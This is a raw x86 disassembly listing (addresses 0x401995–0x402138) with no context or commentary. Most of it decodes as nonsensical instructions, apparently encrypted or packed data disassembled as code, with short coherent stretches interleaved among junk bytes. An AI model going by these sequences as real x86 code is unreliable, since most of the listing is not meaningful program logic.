  401995:	mov    ecx,0x161dc76c
  40199a:	out    0xd0,al
  40199c:	scas   al,BYTE PTR es:[edi]
  40199d:	xor    DWORD PTR [ecx],edx
  40199f:	push   ss
  4019a0:	cwde   
  4019a1:	mov    dh,0x42
  4019a3:	mov    dl,0xb9
  4019a5:	sbb    dl,BYTE PTR [edi]
  4019a7:	loop   0x40192e
  4019a9:	dec    esp
  4019aa:	outs   dx,DWORD PTR ds:[esi]
  4019ab:	retf   0x2e2a
  4019ae:	nop
  4019af:	in     eax,0xc3
  4019b1:	mov    cl,bl
  4019b3:	xor    DWORD PTR [ebx+0x51],ebx
  4019b6:	in     al,0xef
  4019b8:	int    0x3f
  4019ba:	adc    BYTE PTR [ebx+0x56],dl
  4019bd:	out    dx,al
  4019be:	in     al,dx
  4019bf:	std    
  4019c0:	repz mov WORD PTR [ebx],cs
  4019c3:	add    al,0x95
  4019c5:	push   ss
  4019c6:	cmp    BYTE PTR [esi],cl
  4019c8:	pop    esi
  4019c9:	inc    esi
  4019ca:	sahf   
  4019cb:	loopne 0x40195b
  4019cd:	and    ebx,DWORD PTR [edx-0x6a0fc69e]
  4019d3:	jmp    0x401a05
  4019d5:	das    
  4019d6:	(bad)  
  4019d7:	pop    edi
  4019d8:	mov    cl,0xc5
  4019da:	ret    0x4b3b
  4019dd:	sbb    DWORD PTR [ebp-0x66],0xffffffea
  4019e1:	in     eax,dx
  4019e2:	call   0x85264952
  4019e7:	loop   0x401a4a
  4019e9:	mov    ecx,0x7a589563
  4019ee:	mov    cl,0x72
  4019f0:	out    0x25,al
  4019f2:	cwde   
  4019f3:	shl    DWORD PTR [edi],0xa7
  4019f6:	push   edx
  4019f8:	in     al,dx
  4019f9:	imul   ebx,ebx,0xfffffffc
  4019fc:	push   ss
  4019fd:	mov    ebp,0x4f9e54a8
  401a02:	pushf  
  401a03:	std    
  401a04:	mov    ah,0x60
  401a06:	bound  esp,QWORD PTR [ebx]
  401a08:	add    BYTE PTR [edi+0x5ce46215],bh
  401a0e:	add    ebp,DWORD PTR [edi]
  401a10:	shld   esi,edx,cl
  401a13:	cmp    eax,0x8b75ac21
  401a18:	mov    eax,0x25a32164
  401a1d:	sub    al,0xd
  401a1f:	in     al,0x69
  401a21:	push   ss
  401a22:	adc    al,0xa4
  401a24:	adc    ah,al
  401a26:	leave  
  401a27:	jnp    0x401a34
  401a29:	inc    edx
  401a2a:	shr    BYTE PTR [edx],cl
  401a2c:	and    ah,BYTE PTR ds:0x4db36e8f
  401a32:	jb     0x4019c6
  401a34:	std    
  401a35:	jb     0x401a33
  401a37:	fbld   TBYTE PTR [ebp-0x5aa9023]
  401a3d:	jno    0x401a62
  401a3f:	jg     0x401a61
  401a41:	xchg   BYTE PTR [edx+0x76ed15f5],bl
  401a47:	neg    DWORD PTR [ebp+eiz*8+0x451a36c4]
  401a4e:	inc    edi
  401a4f:	lea    esi,[esp+eiz*2]
  401a52:	sub    DWORD PTR [edi],0x8262d4b5
  401a58:	in     eax,dx
  401a59:	scas   al,BYTE PTR es:[edi]
  401a5a:	pop    esp
  401a5b:	lods   al,BYTE PTR ds:[esi]
  401a5c:	mov    cl,0x48
  401a5e:	pop    es
  401a5f:	jecxz  0x4019f7
  401a61:	add    eax,0xa92fc7f6
  401a66:	sub    eax,0x31c1e807
  401a6b:	ja     0x401a88
  401a6d:	(bad)  
  401a6e:	pop    ebx
  401a6f:	mov    al,0x90
  401a71:	mov    ebp,0x5f2e4352
  401a76:	mov    DWORD PTR gs:[ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	pop    esp
  401a8c:	mov    bl,0x57
  401a8e:	loop   0x401a9e
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401acf
  401a98:	nop
  401a99:	sub    ah,0xd4
  401a9c:	jge    0x401a5a
  401a9e:	pop    edi
  401a9f:	dec    ebx
  401aa0:	or     BYTE PTR [esi+0x3b984d92],bh
  401aa6:	fucomip st,st(6)
  401aa8:	(bad)  
  401aa9:	push   0xe606f6a4
  401aae:	outs   dx,DWORD PTR ds:[esi]
  401aaf:	pop    ebp
  401ab0:	and    DWORD PTR [edx+0x1a2dd6fb],0xffffffcb
  401ab7:	(bad)  
  401ab8:	push   ecx
  401ab9:	inc    ebx
  401aba:	sbb    eax,0x4175ae1e
  401abf:	sti    
  401ac0:	outs   dx,DWORD PTR ds:[esi]
  401ac1:	int    0xc6
  401ac3:	(bad)  
  401ac4:	imul   esp
  401ac6:	lea    eax,[ecx-0x8]
  401ac9:	cmp    ah,BYTE PTR [eax-0x3c]
  401acc:	or     eax,0x4b9d8f53
  401ad1:	dec    ebx
  401ad2:	sar    ebx,cl
  401ad4:	test   BYTE PTR [ecx-0x6f],0xe5
  401ad8:	push   ebx
  401ad9:	lods   al,BYTE PTR ds:[esi]
  401ada:	cmp    bl,ch
  401adc:	jmp    0xf98f9206
  401ae1:	fdivr  DWORD PTR ss:[edi+0x7a455eec]
  401ae8:	ds adc esi,ebx
  401aeb:	repnz xchg edx,eax
  401aed:	pop    eax
  401aee:	sti    
  401aef:	cmp    BYTE PTR [eax+edi*1+0x3c],ch
  401af3:	adc    al,0x6e
  401af5:	or     eax,ecx
  401af7:	das    
  401af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401af9:	dec    di
  401afb:	div    BYTE PTR [ebp+0xf]
  401afe:	dec    esi
  401aff:	pop    ebp
  401b00:	inc    ebp
  401b01:	loop   0x401b29
  401b03:	mov    esi,0xf458c6a8
  401b08:	xchg   ebx,eax
  401b09:	push   cs
  401b0a:	push   edi
  401b0b:	mov    edx,0x8005862e
  401b10:	inc    edi
  401b11:	in     eax,0x7a
  401b13:	and    dl,BYTE PTR [esi+0x40]
  401b16:	(bad)  
  401b18:	inc    edx
  401b19:	add    edi,ebp
  401b1b:	arpl   WORD PTR [esi],ax
  401b1d:	xor    dl,al
  401b1f:	fwait
  401b20:	in     al,0x25
  401b22:	sbb    DWORD PTR [ebp+0x59],edi
  401b25:	pop    ebx
  401b26:	adc    BYTE PTR [ebp+0x73dc9fe],al
  401b2c:	es enter 0xbd25,0x72
  401b31:	test   eax,0x4cc1669b
  401b36:	repz and al,0x7
  401b39:	addr16 aaa 
  401b3b:	push   edx
  401b3c:	jp     0x401b4f
  401b3e:	jno    0x401b92
  401b40:	mov    ah,bh
  401b42:	cwde   
  401b43:	leave  
  401b44:	int    0xd
  401b46:	retf   0x118
  401b49:	or     eax,DWORD PTR [ecx]
  401b4b:	js     0x401b9d
  401b4d:	adc    al,0xdf
  401b4f:	cwde   
  401b50:	inc    edi
  401b51:	ins    BYTE PTR es:[edi],dx
  401b52:	pop    edx
  401b53:	xlat   BYTE PTR ds:[ebx]
  401b54:	jge    0x401b64
  401b56:	push   edi
  401b57:	mov    ds:0xe3d3d2f0,al
  401b5c:	mov    esp,0xf543d603
  401b61:	cmp    dl,BYTE PTR [ebp-0x64716fb3]
  401b67:	jne    0x401b21
  401b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b6a:	mov    al,0xe2
  401b6c:	ins    DWORD PTR es:[edi],dx
  401b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b6e:	jns    0x401b6d
  401b70:	cmp    eax,0xd20b0679
  401b75:	jecxz  0x401b51
  401b77:	cmc    
  401b78:	pop    ss
  401b79:	(bad)  
  401b7a:	std    
  401b7b:	ficom  WORD PTR [ebx]
  401b7d:	and    eax,0x59d385d
  401b82:	push   ebx
  401b83:	or     al,0x63
  401b85:	mov    dh,0x63
  401b87:	pop    esp
  401b88:	in     eax,dx
  401b89:	or     DWORD PTR [esi-0x6b59c3e4],0xffffff99
  401b90:	test   DWORD PTR [edi+ebp*1+0x252cd3d0],eax
  401b97:	push   esp
  401b98:	xchg   edx,eax
  401b99:	or     BYTE PTR [edx+0x66],bh
  401b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b9d:	jg     0x401bfc
  401b9f:	ds call 0xc1ae04f7
  401ba5:	or     cl,BYTE PTR [edx+0x1296f739]
  401bab:	jmp    0x6be21b60
  401bb0:	sbb    BYTE PTR [esi+0x36d6d631],ch
  401bb6:	cmp    edx,DWORD PTR [ebx+0x1c8f9a0]
  401bbc:	xchg   edi,eax
  401bbd:	mov    dl,0x2b
  401bbf:	mov    esi,0xe9751985
  401bc4:	shrd   esi,ecx,cl
  401bc7:	adc    cl,dl
  401bc9:	mov    dl,0xa2
  401bcb:	xlat   BYTE PTR ds:[ebx]
  401bcc:	fisttp QWORD PTR [esi-0x4a2ad97a]
  401bd2:	inc    esi
  401bd3:	ret    0xb36e
  401bd6:	jbe    0x401bca
  401bd8:	push   ebx
  401bd9:	lods   eax,DWORD PTR ds:[esi]
  401bda:	and    ebx,DWORD PTR ss:[ecx+0x6d9dccfb]
  401be1:	out    0xc5,al
  401be3:	push   ebp
  401be4:	sub    eax,0x474af69b
  401be9:	jmp    0x401b94
  401beb:	sub    al,0xb1
  401bed:	mov    eax,ds:0xe650c7a9
  401bf2:	in     eax,0x11
  401bf4:	mov    ecx,0xe04bc8e4
  401bf9:	sub    eax,0x41f23a63
  401bfe:	mov    dh,0x6a
  401c00:	inc    edx
  401c01:	xchg   esi,eax
  401c02:	test   esp,eax
  401c04:	mov    BYTE PTR [ecx],dl
  401c06:	(bad)  
  401c08:	jp     0x401c4d
  401c0a:	(bad)  
  401c0b:	xchg   ebp,eax
  401c0c:	pop    ds
  401c0d:	sbb    dl,BYTE PTR [esi]
  401c0f:	jg     0x401bb0
  401c11:	sbb    ah,BYTE PTR ds:0x2666837a
  401c17:	xor    DWORD PTR [eax],ebx
  401c19:	loop   0x401bcd
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	xor    BYTE PTR [ecx+0x798acd72],cl
  401c46:	jle    0x401cc6
  401c48:	cli    
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401ca8
  401c4d:	mov    DWORD PTR [edi+0x1d],esi
  401c50:	(bad)  
  401c51:	fst    DWORD PTR [ebp+0x3f]
  401c54:	xor    eax,0x72deeab6
  401c59:	and    BYTE PTR [eax+0x34],0x2d
  401c5d:	inc    edx
  401c5e:	mov    dl,cl
  401c60:	push   esp
  401c61:	mov    cl,0x55
  401c63:	add    al,0x52
  401c65:	xchg   esi,eax
  401c66:	sub    eax,0x934a22a5
  401c6b:	js     0x401bf9
  401c6d:	mov    ebp,0xcf6445e2
  401c72:	repz sub ch,BYTE PTR [edx]
  401c75:	jecxz  0x401c1c
  401c77:	push   0xb3fccac3
  401c7c:	cmp    DWORD PTR [eax-0x757a1591],eax
  401c82:	clc    
  401c83:	rcr    cl,1
  401c85:	xchg   ecx,eax
  401c86:	(bad)  
  401c87:	push   0x8a5e9216
  401c8c:	aaa    
  401c8d:	mov    ss,WORD PTR ds:0xcf392ddb
  401c93:	imul   edx,DWORD PTR [edx],0xc34c55c4
  401c99:	fisubr DWORD PTR [ecx+eiz*1+0x44]
  401c9e:	cs jmp 0x6c83:0x9fa2dd4d
  401ca6:	(bad)  
  401ca7:	fld    DWORD PTR [ecx]
  401ca9:	nop
  401caa:	ins    BYTE PTR es:[edi],dx
  401cab:	mov    edx,0xc309c290
  401cb1:	push   ds
  401cb2:	call   0x7f7eb7ac
  401cb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cb8:	in     al,dx
  401cb9:	xchg   edx,eax
  401cba:	mov    al,0x26
  401cbc:	pop    ebp
  401cbd:	jle    0x401c9c
  401cbf:	jle    0x401cd6
  401cc1:	mov    bl,0x4c
  401cc3:	ja     0x401cd5
  401cc5:	sub    dl,BYTE PTR [esp+ebx*4]
  401cc8:	inc    eax
  401cc9:	push   edx
  401cca:	daa    
  401ccb:	sbb    eax,0xdc101a18
  401cd0:	mov    bh,0x59
  401cd2:	sbb    ebx,edi
  401cd4:	dec    esi
  401cd5:	int3   
  401cd6:	xchg   edx,eax
  401cd7:	sub    BYTE PTR [ecx],bl
  401cd9:	ret    
  401cda:	(bad)  
  401cdb:	in     eax,dx
  401cdc:	das    
  401cdd:	aas    
  401cde:	jne    0x401d26
  401ce0:	jno    0x401d3c
  401ce2:	mov    gs,ebp
  401ce4:	xchg   edi,eax
  401ce5:	cmp    BYTE PTR [ebx],cl
  401ce7:	rcl    DWORD PTR [edx+0x364d78ae],1
  401ced:	jb     0x401cd6
  401cef:	btr    esi,ebp
  401cf2:	dec    edx
  401cf3:	xchg   esi,eax
  401cf4:	dec    ebp
  401cf5:	aas    
  401cf6:	and    ebp,DWORD PTR [eax+0x66]
  401cf9:	sub    eax,0xc2035aad
  401cfe:	jne    0x401cd7
  401d00:	sbb    BYTE PTR [edi+0x2efb2efd],0x1e
  401d07:	sub    al,0xfb
  401d09:	cmp    edx,DWORD PTR [eax+0x5628f719]
  401d0f:	jecxz  0x401d05
  401d11:	mov    cl,0x1e
  401d13:	inc    ebx
  401d14:	popa   
  401d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d16:	aam    0x53
  401d18:	xchg   ebp,eax
  401d19:	jle    0x401d62
  401d1b:	mov    ebx,0x28f55811
  401d20:	add    ebx,DWORD PTR [ecx+0x4c]
  401d23:	fdivr  DWORD PTR [ecx+0x45fcd2d2]
  401d29:	jl     0x401ccb
  401d2b:	xchg   edi,eax
  401d2c:	aaa    
  401d2d:	mov    ebx,0x5055312d
  401d32:	out    0x6e,al
  401d34:	adc    eax,0x3a01043
  401d39:	cmp    ah,BYTE PTR [edx+ecx*8-0x6526233f]
  401d40:	imul   esp,DWORD PTR [eax+0x54a51a0],0x17
  401d47:	push   ss
  401d48:	frstor ds:0xf7e8cd07
  401d4e:	ss mov ebp,0xc5f3d74b
  401d54:	repz or cl,BYTE PTR [ebx-0x2]
  401d58:	adc    al,0xea
  401d5a:	mov    esi,0x9e53d275
  401d5f:	int    0xaf
  401d61:	xchg   ecx,eax
  401d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d63:	(bad)  
  401d64:	aam    0xef
  401d66:	leave  
  401d67:	mov    ds:0x8eb00b63,al
  401d6c:	(bad)  
  401d6d:	xor    esp,DWORD PTR [ebp-0x7a22a227]
  401d73:	shl    ch,0x36
  401d76:	mov    dl,0xa0
  401d78:	dec    edx
  401d79:	add    eax,0x3cd9725
  401d7e:	xchg   edi,eax
  401d7f:	mov    ebp,0x2d363c22
  401d84:	jne    0x401d78
  401d86:	cmp    DWORD PTR [eax+ebp*1],edi
  401d89:	xchg   ebx,eax
  401d8a:	pop    ebp
  401d8b:	mov    WORD PTR [eax-0x61],?
  401d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d8f:	dec    edx
  401d90:	inc    esi
  401d91:	aas    
  401d92:	add    al,0x32
  401d94:	push   edi
  401d95:	popa   
  401d96:	xor    eax,0xa48b5427
  401d9b:	xlat   BYTE PTR ds:[ebx]
  401d9c:	loopne 0x401daf
  401d9e:	dec    edx
  401d9f:	jo     0x401db7
  401da1:	shr    DWORD PTR [ecx-0x4c],cl
  401da4:	mov    bl,BYTE PTR [esi]
  401da6:	int3   
  401da7:	jp     0x401df5
  401da9:	xor    DWORD PTR [edi+0x6a],ecx
  401dac:	add    esp,esp
  401dae:	jl     0x401e2d
  401db0:	add    ebx,DWORD PTR [eax]
  401db2:	cmp    eax,0xe8f02f7e
  401db7:	dec    esi
  401db8:	mov    ecx,0x65ecf140
  401dbd:	push   ebp
  401dbe:	jl     0x401de0
  401dc0:	gs (bad) 
  401dc3:	adc    edx,DWORD PTR [edi-0x1f]
  401dc6:	mov    bl,0xc0
  401dc8:	xchg   edx,eax
  401dc9:	rcl    DWORD PTR [edx+0x4f],0xce
  401dcd:	or     edi,DWORD PTR ss:[eax+0x3]
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x2cc39638],ebp
  401e0d:	xor    BYTE PTR [esi],dl
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401da8
  401e17:	loop   0x401dbe
  401e19:	cmp    eax,0xd93cf76
  401e1e:	test   al,0x57
  401e20:	pop    ss
  401e21:	fld    QWORD PTR [esp+ebp*1-0x25]
  401e25:	arpl   WORD PTR [ebp+0x5e8b282a],bp
  401e2b:	xlat   BYTE PTR ds:[ebx]
  401e2c:	jmp    0x401de9
  401e2e:	jo     0x401db1
  401e30:	shr    eax,0x7e
  401e33:	jae    0x401e7e
  401e35:	les    ecx,FWORD PTR [edx+0x265a3378]
  401e3b:	das    
  401e3c:	fcomi  st,st(0)
  401e3e:	adc    esp,DWORD PTR [edi-0xc]
  401e41:	imul   esi,DWORD PTR [ebx+0x519fd266],0x40
  401e48:	daa    
  401e49:	or     BYTE PTR [ecx+esi*4+0x1cf952be],cl
  401e50:	push   eax
  401e51:	out    0x33,eax
  401e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e54:	adc    al,0xd2
  401e56:	in     al,0x88
  401e58:	sbb    BYTE PTR [ebx],bl
  401e5a:	push   es
  401e5b:	sub    eax,0xa32e42e
  401e60:	inc    BYTE PTR [ecx]
  401e62:	cli    
  401e63:	jecxz  0x401e66
  401e65:	(bad)  
  401e66:	(bad)  
  401e67:	stos   BYTE PTR es:[edi],al
  401e68:	fs pop ebx
  401e6a:	and    BYTE PTR [edi-0x220f52f],dh
  401e70:	call   0xfdc131fd
  401e75:	mov    ebp,0xe4babb89
  401e7a:	jg     0x401e32
  401e7c:	dec    esp
  401e7d:	pop    esp
  401e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e7f:	subps  xmm2,XMMWORD PTR [edx-0x80]
  401e83:	add    BYTE PTR [esi+0x32ad0e8e],dl
  401e89:	sti    
  401e8a:	push   esi
  401e8b:	pop    edx
  401e8c:	cli    
  401e8d:	jb     0x401ef7
  401e8f:	lahf   
  401e90:	and    ah,al
  401e92:	bound  esp,QWORD PTR [esi-0x51]
  401e95:	push   esi
  401e96:	mov    edx,0x51eca5ad
  401e9b:	sub    ch,BYTE PTR [ebp+0x1e8978b6]
  401ea1:	cmp    bl,dl
  401ea3:	mov    ebx,0x5ee415dc
  401ea8:	imul   edi,edx,0x48e7069c
  401eae:	sti    
  401eaf:	stos   DWORD PTR es:[edi],eax
  401eb0:	push   ds
  401eb1:	mov    bh,bh
  401eb3:	shl    ebx,1
  401eb5:	ja     0x401f14
  401eb7:	cwde   
  401eb8:	inc    edi
  401eb9:	lock nop
  401ebb:	(bad)  
  401ebc:	cmp    BYTE PTR [edi],dl
  401ebe:	pop    ecx
  401ebf:	sub    eax,0x8aa16a96
  401ec4:	stos   DWORD PTR es:[edi],eax
  401ec5:	adc    eax,0x37759141
  401eca:	add    eax,0x5b3c2a97
  401ecf:	xor    dh,BYTE PTR [edx+0x66c29534]
  401ed5:	or     eax,0x39f588d7
  401eda:	mov    ecx,0x84a2057e
  401edf:	std    
  401ee0:	mov    edi,0x2dea831c
  401ee5:	pop    ecx
  401ee6:	mov    al,0x0
  401ee8:	mov    BYTE PTR [edi],cl
  401eea:	add    al,0x55
  401eec:	gs (bad) 
  401eee:	jae    0x401ee5
  401ef0:	cmc    
  401ef1:	imul   ecx,DWORD PTR [ecx+0x43],0x8e42cb4e
  401ef8:	and    edi,DWORD PTR [ebp-0x5b]
  401efb:	add    al,0x78
  401efd:	out    dx,eax
  401efe:	lds    ebx,FWORD PTR [edi+0x40]
  401f01:	call   0x8c760063
  401f06:	shr    BYTE PTR [ebp+0xad41101],1
  401f0c:	xchg   edi,eax
  401f0d:	cdq    
  401f0e:	xchg   esp,eax
  401f0f:	fyl2xp1 
  401f11:	sahf   
  401f12:	adc    eax,0xe1652fca
  401f17:	mov    ebp,0x33f1794f
  401f1c:	sbb    BYTE PTR [esi+0x1f],bl
  401f1f:	sbb    ah,bl
  401f21:	mov    cs,edi
  401f23:	xchg   esi,eax
  401f24:	hlt    
  401f25:	das    
  401f26:	xor    al,dh
  401f28:	pop    edi
  401f29:	dec    edi
  401f2a:	mov    al,0xdc
  401f2c:	mov    cl,0x90
  401f2e:	jbe    0x401ede
  401f30:	out    0xc7,al
  401f32:	or     ah,dl
  401f34:	inc    edi
  401f35:	xchg   edi,eax
  401f36:	jecxz  0x401f3b
  401f38:	adc    BYTE PTR [ebx+0x221771f0],bh
  401f3e:	or     esi,DWORD PTR [ebx]
  401f40:	sub    al,0xb4
  401f42:	inc    edi
  401f43:	(bad)  
  401f44:	shl    DWORD PTR [edx-0x78],cl
  401f47:	add    eax,DWORD PTR ds:0x34d56373
  401f4d:	xor    BYTE PTR gs:[esi-0x60fea7f5],dh
  401f54:	xor    DWORD PTR ds:0x2d71b2a9,edx
  401f5a:	jmp    0x7e90:0x4537d2ed
  401f61:	fimul  WORD PTR [esi+eiz*8+0x3240830a]
  401f68:	or     ecx,DWORD PTR [ebp-0x76fe198a]
  401f6e:	mov    WORD PTR [ebp+0x21],cs
  401f71:	sbb    ebx,DWORD PTR [ebp-0x19f7b28e]
  401f77:	inc    edx
  401f78:	retf   0x865d
  401f7b:	xchg   ebp,eax
  401f7c:	push   0xd2182f86
  401f81:	jae    0x401f7c
  401f83:	ins    DWORD PTR es:[edi],dx
  401f84:	loop   0x401f41
  401f86:	test   cl,al
  401f88:	xor    BYTE PTR [ebx],0x20
  401f8b:	push   edx
  401f8c:	mov    dh,0x1e
  401f8e:	pop    eax
  401f8f:	pushf  
  401f90:	sbb    al,0x1c
  401f92:	dec    eax
  401f93:	fstp   TBYTE PTR [edi+0x7e]
  401f96:	sub    al,0x36
  401f98:	daa    
  401f99:	xor    BYTE PTR [edi],cl
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xd3f1ecf3
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f9c
  401fcc:	in     al,0x88
  401fce:	push   esp
  401fcf:	xor    ecx,DWORD PTR [ecx-0x6f6d5aa6]
  401fd5:	in     eax,dx
  401fd6:	xchg   edi,eax
  401fd7:	pop    ss
  401fd8:	xor    DWORD PTR [ecx+0x21feb5ce],0x7ef7332a
  401fe2:	ss mov esi,0x8b6b5903
  401fe8:	sub    al,0x21
  401fea:	sub    al,0xa1
  401fec:	ins    BYTE PTR es:[edi],dx
  401fed:	fdivr  QWORD PTR [ecx-0x7]
  401ff0:	loopne 0x402014
  401ff2:	nop
  401ff3:	retf   
  401ff4:	cmp    cl,BYTE PTR [esi-0x4b]
  401ff7:	inc    ebx
  401ff8:	inc    ebx
  401ff9:	pop    edi
  401ffa:	add    DWORD PTR [eax],ebp
  401ffc:	clc    
  401ffd:	add    edi,DWORD PTR fs:[eax+0x9]
  402001:	inc    DWORD PTR [edi+0x7063abf5]
  402007:	lods   al,BYTE PTR ds:[esi]
  402008:	fsubr  DWORD PTR [eax-0x2a]
  40200b:	xor    cl,ah
  40200d:	push   cs
  40200e:	cmc    
  40200f:	shr    BYTE PTR [ebx-0x12cfab7e],0x70
  402016:	jbe    0x401fe9
  402018:	ds pop ebp
  40201a:	fstp   DWORD PTR [ecx+0x7]
  40201d:	pusha  
  40201e:	in     eax,dx
  40201f:	mov    dl,0x83
  402021:	lds    esp,FWORD PTR [esi-0x7dceff7c]
  402027:	mov    al,0xef
  402029:	sbb    eax,0xd593844e
  40202e:	adc    bh,0xea
  402031:	lods   al,BYTE PTR ds:[esi]
  402032:	pop    es
  402033:	(bad)  
  402034:	cwde   
  402035:	mov    edi,0xc19d0e5f
  40203b:	xchg   BYTE PTR ds:0x658a484a,ah
  402041:	std    
  402042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402043:	mov    esi,0x384f5940
  402048:	loopne 0x40205b
  40204a:	std    
  40204b:	lock dec edx
  40204d:	aaa    
  40204e:	ret    
  40204f:	mov    ebx,0x15c21bbf
  402054:	bound  ebp,QWORD PTR [ecx-0x42]
  402057:	lds    esi,FWORD PTR [edx+0x35]
  40205a:	stos   DWORD PTR es:[edi],eax
  40205b:	sbb    BYTE PTR [edi-0x7d],ch
  40205e:	(bad)  
  40205f:	scas   eax,DWORD PTR es:[edi]
  402060:	jb     0x402043
  402062:	adc    ch,BYTE PTR [ebp-0x54]
  402065:	xor    esp,DWORD PTR [ebp+0x345b6130]
  40206b:	enter  0x4fac,0x91
  40206f:	and    eax,0x6dda3b3
  402074:	jmp    0x8e2c:0x1ba84260
  40207b:	mov    bl,0xa8
  40207d:	hlt    
  40207e:	ds jmp 0x40209f
  402081:	sub    edx,ebx
  402083:	or     dl,BYTE PTR [ebx]
  402085:	inc    ebp
  402086:	sbb    DWORD PTR [edi],ebp
  402088:	ror    DWORD PTR [ecx],cl
  40208a:	push   ecx
  40208b:	les    ecx,FWORD PTR [esi-0x3880468]
  402091:	pop    es
  402092:	fcmovnu st,st(6)
  402094:	popf   
  402095:	push   0x41c14a90
  40209a:	cmp    eax,ebx
  40209c:	push   ebp
  40209d:	popa   
  40209e:	sub    esp,DWORD PTR [edx+0x2fc3b8e9]
  4020a4:	inc    esp
  4020a5:	addr16 iret 
  4020a7:	or     DWORD PTR [edx+0x5],esp
  4020aa:	fisub  WORD PTR [ebx-0x5a39c216]
  4020b0:	xchg   BYTE PTR [eax],ch
  4020b2:	or     DWORD PTR [ecx],eax
  4020b4:	out    0x86,al
  4020b6:	and    ah,BYTE PTR [edi-0x4]
  4020b9:	push   esi
  4020ba:	mov    ebp,0x14f728b3
  4020bf:	dec    ebx
  4020c0:	retf   0xafea
  4020c3:	mov    ah,0x9b
  4020c5:	fcom   DWORD PTR [edx+0x12a04172]
  4020cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020cc:	cmp    dh,al
  4020ce:	cmp    cl,dh
  4020d0:	cmp    ah,ch
  4020d2:	jae    0x4020f8
  4020d4:	adc    ah,cl
  4020d6:	fwait
  4020d7:	xchg   edx,eax
  4020d8:	mov    ah,0xa6
  4020da:	sbb    BYTE PTR [eax+ebp*2-0x7],ch
  4020de:	dec    ebx
  4020df:	shl    DWORD PTR [eax],cl
  4020e1:	cmp    edx,eax
  4020e3:	and    BYTE PTR [ebx],al
  4020e5:	lock nop
  4020e7:	pop    ebp
  4020e8:	add    esp,esp
  4020ea:	and    BYTE PTR [edi+esi*8+0x26],ah
  4020ee:	outs   dx,BYTE PTR ds:[esi]
  4020ef:	pop    eax
  4020f0:	push   esp
  4020f1:	jmp    0x402152
  4020f3:	push   cs
  4020f4:	out    dx,eax
  4020f5:	xchg   ebp,eax
  4020f6:	mov    DWORD PTR [edx-0x3],eax
  4020f9:	mov    dl,0x23
  4020fb:	push   esp
  4020fc:	sbb    al,bl
  4020fe:	ds jb  0x40211b
  402101:	xor    BYTE PTR ds:0x6f3bd4bd,ah
  402107:	sbb    esi,DWORD PTR [esi+eax*8]
  40210a:	ss mov bl,0x5
  40210d:	jl     0x40215e
  40210f:	icebp  
  402110:	push   ss
  402111:	stos   BYTE PTR es:[edi],al
  402112:	adc    eax,0x92730a67
  402117:	loope  0x40213a
  402119:	les    ecx,FWORD PTR [esi-0x5b272e26]
  40211f:	xchg   BYTE PTR [esi+0xfc31147],bl
  402125:	mov    ds:0xbfd20690,eax
  40212a:	adc    eax,0x3db00e0e
  40212f:	arpl   WORD PTR [ebx],di
  402131:	aad    0xc2
  402133:	jmp    0x61ead882
  402138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
